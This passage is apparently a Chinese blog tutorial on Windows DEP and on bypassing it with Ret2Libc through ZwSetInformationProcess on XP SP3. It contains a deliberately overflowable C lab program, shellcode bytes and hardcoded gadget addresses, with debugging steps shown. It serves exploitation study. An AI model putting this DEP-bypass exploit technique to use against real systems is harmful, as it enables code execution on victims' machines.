href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/08/08/gdb%E6%98%BE%E7%A4%BAintel%E5%92%8Catt%E6%B1%87%E7%BC%96/" class="title">gdb显示intel和at&amp;t汇编</a></p><p class="item-date"><time datetime="2022-08-08T14:36:22.000Z" itemprop="datePublished">2022-08-08</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/08/08/gdb%E8%B0%83%E8%AF%95%E5%B8%A6%E5%8F%82%E7%A8%8B%E5%BA%8F/" class="title">gdb调试带参程序</a></p><p class="item-date"><time datetime="2022-08-08T14:33:41.000Z" itemprop="datePublished">2022-08-08</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/08/08/gdb%E6%8F%92%E4%BB%B6%E8%87%AA%E5%8A%A8%E5%88%87%E6%8D%A2/" class="title">gdb插件自动切换</a></p><p class="item-date"><time datetime="2022-08-08T14:31:58.000Z" itemprop="datePublished">2022-08-08</time></p></div></li><li><div class="item-thumb"><a href="/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/" class="thumb"><span class="thumb-image thumb-none"></span></a></div><div class="item-inner"><p class="item-category"><a class="category-link" href="/categories/%E8%BD%AC%E8%BD%BD/">转载</a></p><p class="item-title"><a href="/2022/08/05/Linux%E6%B1%87%E7%BC%96%E4%B9%8B%E4%BC%AA%E6%8C%87%E4%BB%A4/" class="title">Linux汇编之伪指令</a></p><p class="item-date"><time datetime="2022-08-05T12:56:04.000Z" itemprop="datePublished">2022-08-05</time></p></div></li></ul></div></div></div></aside><aside class="sidebar sidebar-toc collapse in" id="collapseToc" itemscope itemtype="http://schema.org/WPSideBar"><div class="slimContent"><nav id="toc" class="article-toc"><h3 class="toc-title">文章目录</h3><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#dep-%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BF%9D%E6%8A%A4%E5%8E%9F%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">DEP 机制的保护原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#dep-%E7%9A%84%E4%B8%BB%E8%A6%81%E4%BD%9C%E7%94%A8"><span class="toc-number">1.1.</span> <span class="toc-text">DEP 的主要作用：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dep-%E5%B7%A5%E4%BD%9C%E7%8A%B6%E6%80%81"><span class="toc-number">1.2.</span> <span class="toc-text">DEP 工作状态：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%92%8C-dep-%E5%AF%86%E5%88%87%E7%9B%B8%E5%85%B3%E7%9A%84%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E9%80%89%E9%A1%B9nxcompat"><span class="toc-number">1.3.</span> <span class="toc-text">和 DEP 密切相关的程序链接选项：&#x2F;NXCOMPAT</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dep%E7%9A%84%E5%B1%80%E9%99%90"><span class="toc-number">1.4.</span> <span class="toc-text">DEP的局限：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%9C%AA%E5%90%AF%E7%94%A8-dep-%E7%9A%84%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.</span> <span class="toc-text">攻击未启用 DEP 的程序</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-ret2libc-%E6%8C%91%E6%88%98-dep"><span class="toc-number">3.</span> <span class="toc-text">利用 Ret2Libc 挑战 DEP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-dep-%E7%9A%84-exploit-%E6%96%B9%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">绕过 DEP 的 exploit 方法：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc-%E5%AE%9E%E6%88%98%E4%B9%8B%E5%88%A9%E7%94%A8-zwsetinformationprocess"><span class="toc-number">3.1.1.</span> <span class="toc-text">Ret2Libc 实战之利用 ZwSetinformationProcess</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">3.1.1.1.</span> <span class="toc-text">实验代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF"><span class="toc-number">3.1.1.2.</span> <span class="toc-text">实验思路：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.1.1.3.</span> <span class="toc-text">实验步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">3.1.1.4.</span> <span class="toc-text">补充：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc-%E5%AE%9E%E6%88%98%E4%B9%8B%E5%88%A9%E7%94%A8-virtualprotect"><span class="toc-number">3.1.2.</span> <span class="toc-text">Ret2Libc 实战之利用 VirtualProtect</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-2"><span class="toc-number">3.1.2.1.</span> <span class="toc-text">实验代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF-2"><span class="toc-number">3.1.2.2.</span> <span class="toc-text">实验思路：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">3.1.2.3.</span> <span class="toc-text">实验步骤：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2libc-%E5%AE%9E%E6%88%98%E4%B9%8B%E5%88%A9%E7%94%A8-virtualalloc"><span class="toc-number">3.1.3.</span> <span class="toc-text">Ret2Libc 实战之利用 VirtualAlloc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E4%BB%A3%E7%A0%81-3"><span class="toc-number">3.1.3.1.</span> <span class="toc-text">实验代码：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%80%9D%E8%B7%AF-3"><span class="toc-number">3.1.3.2.</span> <span class="toc-text">实验思路：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C%E6%AD%A5%E9%AA%A4-3"><span class="toc-number">3.1.3.3.</span> <span class="toc-text">实验步骤：</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%AF%E6%89%A7%E8%A1%8C%E5%86%85%E5%AD%98%E6%8C%91%E6%88%98-dep"><span class="toc-number">4.</span> <span class="toc-text">利用可执行内存挑战 DEP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">源码：</span></a></li></ol></li></ol></nav></div></aside><main class="main" role="main"><div class="content"><article id="post-数据与程序的分水岭-DEP" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting"><div class="article-header"><h1 class="article-title" itemprop="name">数据与程序的分水岭:DEP</h1><div class="article-meta"><span class="article-date"><i class="icon icon-calendar-check"></i> <a href="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/" class="article-date"><time datetime="2022-06-27T01:21:00.000Z" itemprop="datePublished">2022-06-27</time> </a></span><span class="article-category"><i class="icon icon-folder"></i> <a class="article-category-link" href="/categories/0day%E5%AE%89%E5%85%A8/">0day安全</a> </span><span class="article-tag"><i class="icon icon-tags"></i> <a class="article-tag-link-link" href="/tags/DEP/" rel="tag">DEP</a> </span><span class="post-comment"><i class="icon icon-comment"></i> <a href="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/#comments" class="article-comment-link">评论</a></span> <span class="post-wordcount hidden-xs" itemprop="wordCount">字数统计: 12.2k(字)</span> <span class="post-readcount hidden-xs" itemprop="timeRequired">阅读时长: 57(分)</span></div></div><div class="article-entry marked-body" itemprop="articleBody"><p>[TOC]</p><h1 id="dep-机制的保护原理"><a class="markdownIt-Anchor" href="#dep-机制的保护原理"></a> DEP 机制的保护原理</h1><p>溢出攻击的<strong>根源</strong>在于计算机未明确区分数据和代码，DEP（数据执行保护，Data Execution Prevention）的<strong>基本原理</strong>就是将数据所在页面标识为不可执行。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618160130800-16562939498331.png" alt="image-20220618160130800"></p><h2 id="dep-的主要作用"><a class="markdownIt-Anchor" href="#dep-的主要作用"></a> <strong>DEP 的主要作用</strong>：</h2><p>阻止数据页（如默认的堆页、各种堆栈页以及内存池页）执行代码。</p><p>根据实现的机制不同可分为：软件DEP（Software DEP）和硬件DEP（Hardware-enforced DEP）</p><p><strong>软件DEP</strong>就是SafeSEH，阻止利用 S.E.H 的攻击。</p><p><strong>硬件DEP</strong>需要CPU支持，AMD 称之为 No-Execute Page-Protection（NX），Intel 称之为 Execute Disable Bit（XD）。</p><p>操作系统通过设置内存页的 <strong>NX/XD 属性标记</strong>，来指明不能从该内存执行代码。内存的页面表（Page Table）中的标识位（NX/XD）来标识是否允许在该页上执行指令。标识位为 0 表示这个页面允许执行指令，设置为 1 表示该页面不允许执行指令。</p><h2 id="dep-工作状态"><a class="markdownIt-Anchor" href="#dep-工作状态"></a> <strong>DEP 工作状态：</strong></h2><p>（1）Option：默认仅将 DEP 保护应用于 Windows 系统组件和服务。但用户可以通过应用程序兼容性工具(ACT， Application Compatibility Toolkit)为选定的程序启用 DEP。DEP 可被程序动态关闭。</p><p>（2）Optout：为排除列表程序外的所有程序和服务启用 DEP，用户可以手动在排除列表中指定不启用 DEP 保护的程序和服务。DEP 可被应用程序动态关闭。</p><p>（3）AlwaysON：对所有进程启用 DEP 保护，不存在排序列表，DEP 不可被关闭。</p><p>（4）AlwaysOff：对所有进程禁用 DEP，DEP 不能动态开启。</p><h2 id="和-dep-密切相关的程序链接选项nxcompat"><a class="markdownIt-Anchor" href="#和-dep-密切相关的程序链接选项nxcompat"></a> <strong>和 DEP 密切相关的程序链接选项</strong>：/NXCOMPAT</h2><p>在Visual Studio 2008 ( VS 9.0)中，可以在通过菜单中的 Project→<br>project Properties → Configuration Properties→ Linker→ Advanced→ Data Execution Prevention(DEP)中选择是不是使用/NXCOMPAT 编译程序，如下图所示。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618165748260-16562939498342.png" alt="image-20220618165748260"></p><p>采用/NXCOMPAT 编译的程序会在文件的 PE 头中设置 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 标识，该标识通过结构体 IMAGE_OPTIONAL_HEADER 中的 DllCharacteristics 变量进行体现，<strong>当 DllCharacteristics 设置为 0x0100 表示该程序采用了/NXCOMPAT 编译</strong>。</p><p>操作系统中 DEP 一般工作在 Option状态，只保护系统核心进程，而经过 /NXCOMPAT 编译的程序在 Windows vista及后续版本中会<strong>自动启用 DEP 保护</strong>。</p><h2 id="dep的局限"><a class="markdownIt-Anchor" href="#dep的局限"></a> <strong>DEP的局限：</strong></h2><p>（1）硬件 DEP 需要 CPU 支持。<br>（2）由于兼容性，windows 不能对所有进程开启 DEP 保护。<br>（3）/NXCOMPAT 编译选项，或者是 IMAGE_DLLCHARACTERISTICS_NX_COMPAT 的设置，只对 windows vista 以上的系统有效。<br>（4）当 DEP 工作在 Option 和 Optout 下时，DEP 是可以被动态关闭和开启的，这就说明操作系统提供了某些 API 函数控制 DEP状态。早期的 API 调用没有任何限制。</p><h1 id="攻击未启用-dep-的程序"><a class="markdownIt-Anchor" href="#攻击未启用-dep-的程序"></a> 攻击未启用 DEP 的程序</h1><p>DEP 保护对象是进程级的，当某个进程的加载模块中只要有一个模块不支持 DEP，这个进程就不能贸然开启 DEP，否则可能会发生异常。在此不做讨论。</p><h1 id="利用-ret2libc-挑战-dep"><a class="markdownIt-Anchor" href="#利用-ret2libc-挑战-dep"></a> 利用 Ret2Libc 挑战 DEP</h1><p>在 DEP 保护下溢出失败的根本原因是 DEP 检测到程序转到非可执行页执行指令了，如果让程序跳转到一个已经存在的系统函数中（必然处于可执行页上），DEP是不会拦截的。</p><p>Ret2Libc 是 Return-to-llibc 简写，只要为 shellcode 中的每条指令都在代码区找到一条替代指令，就能完成 exploit 想要的功能了。但这仅仅是理论上可行，实际上操作难度极大。</p><h2 id="绕过-dep-的-exploit-方法"><a class="markdownIt-Anchor" href="#绕过-dep-的-exploit-方法"></a> 绕过 DEP 的 exploit 方法：</h2><p>（1）通过跳转到 ZwSetInformationProcess 函数将 DEP 关闭后再转入 shellcode 执行。<br><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618171923634-16562939498343.png" alt="image-20220618171923634"></p><p>（2）通过跳转到 VirtualProtect 函数来将 shellcode 所在内存页设置为可执行状态，然后再转入 shellcode 执行。<br>（3）通过跳转到 VIrtualAlloc 函数开辟一段具有执行权限的内存空间，然后将 shellcode 复制到这段内存中执行。</p><h3 id="ret2libc-实战之利用-zwsetinformationprocess"><a class="markdownIt-Anchor" href="#ret2libc-实战之利用-zwsetinformationprocess"></a> Ret2Libc 实战之利用 ZwSetinformationProcess</h3><p>将进程 DEP 保护关闭。</p><p>一个进程的 DEP 设置标识保存在 KPROCESS 结构中的 _KEXECUTE_OPTIONS 上，而这个标识可以通过 API 函数 ZwQueryInformationProcess 和 ZwSetInformationProcess 进行查询和修改。</p><blockquote><p>题外话： 在有些资料中将这些函数称为 NtQueryInformationProcess 和 NtSetInformation Process，在 Ntdll.dll 中 Nt<strong>函数和 Zw</strong>函数功能是完全一样的，本书中我们统一称之为 Zw**。</p></blockquote><p>_KEXECUTE_OPTIONS 的结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">KEXECUTE_OPTIONS</span><br><span class="line">Pos0ExecuteDisable :1bit</span><br><span class="line">Pos1ExecuteEnable :1bit</span><br><span class="line">Pos2DisableThunkEmulation :1bit</span><br><span class="line">Pos3Permanent :1bit</span><br><span class="line">Pos4ExecuteDispatchEnable :1bit</span><br><span class="line">Pos5ImageDispatchEnable :1bit</span><br><span class="line">Pos6Spare :2bit</span><br></pre></td></tr></table></figure><p>前4个 bit 与 DEP 相关，当前进程 DEP 开启时 ExecuteDisable 位被置 1，当进程 DEP 关闭时 ExecuteEable 位被置 1，DisableThunkEmulation 是为了兼容 ATL 程序设置的，Permanent 被置 1 后表示这些标志都不能再被修改。</p><p>函数 NtSetInformationProcess：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ZwSetInformationProcess(</span><br><span class="line">IN HANDLE ProcessHandle,</span><br><span class="line">IN PROCESS_INFORMATION_CLASS ProcessInformationClass,</span><br><span class="line">IN PVOID ProcessInformation,</span><br><span class="line">IN ULONG ProcessInformationLength );</span><br></pre></td></tr></table></figure><p>第一个参数为进程的句柄，设置为-1 的时候表示为当前进程；第二个参数为信息类；第三个参数可以用来设置_KEXECUTE_OPTIONS，第四个参数为第三个参数的长度。</p><p>关闭 DEP 的参数设置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ULONG ExecuteFlags = MEM_EXECUTE_OPTION_ENABLE;</span><br><span class="line">ZwSetInformationProcess(</span><br><span class="line">NtCurrentProcess(), // (HANDLE)-1</span><br><span class="line">ProcessExecuteFlags, // 0x22</span><br><span class="line">&amp;ExecuteFlags, // ptr to 0x2</span><br><span class="line">sizeof(ExecuteFlags)); // 0x4</span><br></pre></td></tr></table></figure><p>函数的参数中包含 0x00，会造成字符串复制时被截断。既然自己构造参数会出问题，那么就在系统中寻找已经构造好的参数。</p><p>如果一个进程的 Permanent 位没有设置，当它加载 DLL 时，系统就会对这个 DLL 进行 DEP 兼容性检查，当存在兼容性问题时进程的 DEP 就会被关闭。LdrpCheckNXCompatibility 函数，当符合以下条件之一时进程的 DEP 会被关闭：<br>（ 1）当 DLL 受 SafeDisc 版权保护系统保护时；<br>（ 2）当 DLL 包含有.aspcak、 .pcle、 .sforce 等字节时；<br>（ 3） Windows Vista 下面当 DLL 包含在注册表“ HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\ Windows NT\CurrentVersion\Image File Execution Options\DllNXOptions ”键下边标识出不需要启动 DEP 的模块时。</p><p>在 Windows XP SP3 下 LdrpCheckNXCompatibility 关闭 DEP 的具体流程，以 SafeDisc 为例，如下图：</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220618173743193-16562939498344.png" alt="image-20220618173743193"></p><p>模拟 LdrpCheckNXCompatibility 关闭 DEP 的流程，先想办法将 AL 赋值为1，然后转入执行 0x7C93CD24（CMP AL,1） 及后续指令来关闭 DEP，代码如下。</p><h4 id="实验代码"><a class="markdownIt-Anchor" href="#实验代码"></a> 实验代码：</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="string">&quot;\x52\xE2\x92\x7C&quot;</span><span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line">    <span class="string">&quot;\x85\x8B\x1D\x5D&quot;</span><span class="comment">//修正 EBP</span></span><br><span class="line">    <span class="string">&quot;\x19\x4A\x97\x7C&quot;</span><span class="comment">//增大 ESP</span></span><br><span class="line">    <span class="string">&quot;\xB4\xC1\xC5\x7D&quot;</span><span class="comment">//jmp esp</span></span><br><span class="line">    <span class="string">&quot;\x24\xCD\x93\x7C&quot;</span><span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">    <span class="string">&quot;\xE9\x33\xFF\xFF&quot;</span><span class="comment">//回跳指令</span></span><br><span class="line">    <span class="string">&quot;\xFF\x90\x90\x90&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">test</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> tt[<span class="number">176</span>];</span><br><span class="line">    <span class="built_in">strcpy</span>(tt,shellcode);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    HINSTANCE hInst = LoadLibrary(<span class="string">&quot;shell32.dll&quot;</span>);</span><br><span class="line">    <span class="type">char</span> temp[<span class="number">200</span>];</span><br><span class="line">    test();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="实验思路"><a class="markdownIt-Anchor" href="#实验思路"></a> 实验思路：</h4><p>（ 1）为了更直观地反映绕过 DEP 的过程，在实验中不启用 GS 和 SafeSEH。<br>（ 2）函数 test 通过向 str 复制超长字符串造成 str 溢出，进而覆盖函数返回地址。<br>（ 3）将函数的返回地址覆盖为类似 MOV AL,1 retn 的指令，在将 AL 置 1 后转入 0x7C93CD24 关闭 DEP。<br>（ 4）DEP 关闭后 shellcode 就可以正常执行了。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td></tr><tr><td>DEP 状态</td><td>Optout</td></tr><tr><td>编译器</td><td>VC++ 6.0</td></tr><tr><td>编译选项</td><td>禁用优化选项</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><h4 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤：</h4><p><strong>（ 1）将 AL 置为 1，后执行关闭 DEP 指令。</strong></p><p>找到类似 MOV AL,1 RETN 的指令。OllyFindAddr 插件的 Disable DEP —&gt; Disable DEP &lt;= XP SP3 搜索结果的 Step2 就是符合要求的指令。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619135451210-16562939498345.png" alt="image-20220619135451210"></p><p>为避免 shellcode 在复制时被截断，需选择一个不包含 0x00 的地址，使用 0x7C92E252 覆盖函数的返回地址，让函数执行完后将 AL 置 1，然后返回控制流程。</p><p>先用小于 200 个0x90填充 shellcode，找出 tt[0] 的地址（0x0012FDB0)。然后在分析栈，找出 test() 的返回地址（0x0012FE64），来确定 shellcode 的长度为 184字节，shellcode 内容如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>调试运行，在 0x7C92E257（retn）处暂停程序，查看堆栈 ESP=0012FE68，指向 test() 返回地址下方，retn 将返回到 ESP 指向的内存空间（0x7C930200)。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619162125082-16562939498346.png" alt="image-20220619162125082"></p><p>所以我们要在 0x0012FE68 放上 0x7C93CD24（cmp al,1），来让程序转入关闭 DEP 流程，如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">charshellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x52\xE2\x92\x7C&quot;</span> <span class="comment">//MOV EAX,1 RETN 地址</span></span><br><span class="line"><span class="string">&quot;\x24\xCD\x93\x7C&quot;</span> <span class="comment">//关闭 DEP 代码的起始位置</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p><strong>（2）产生异常，EBP 指向位置无法写入，解决问题</strong></p><p>重新编译程序，在 0x7C93CD6F，即关闭 DEP 后的 retn 4 处下断点，然后运行。程序运行后，出现了异常，如下图。程序对 EBP-4 位置写入数据，但是 EBP 在溢出时候被破坏了，目前 EBP-4 为 90909090 不可写入，所以程序出现写入异常，在转入 0x7C93CD24 前我们需要将 EBP 指向一个可写的位置。</p><p><img src="/2022/06/27/%E6%95%B0%E6%8D%AE%E4%B8%8E%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%B0%B4%E5%B2%AD-DEP/image-20220619172626766-16562939498347.png" alt="image-20220619172626766"></p><p>通过类似 PUSH ESP POP EBP RETN 的指令将 EBP 定位到一个可写的位置，用 OllyFindAddr 插件可在 Disable DEP &lt;= XP SP3 搜索结果的 Setp3 部分查看当前内存所有符合条件的指令，如下图所示。</p><p><img 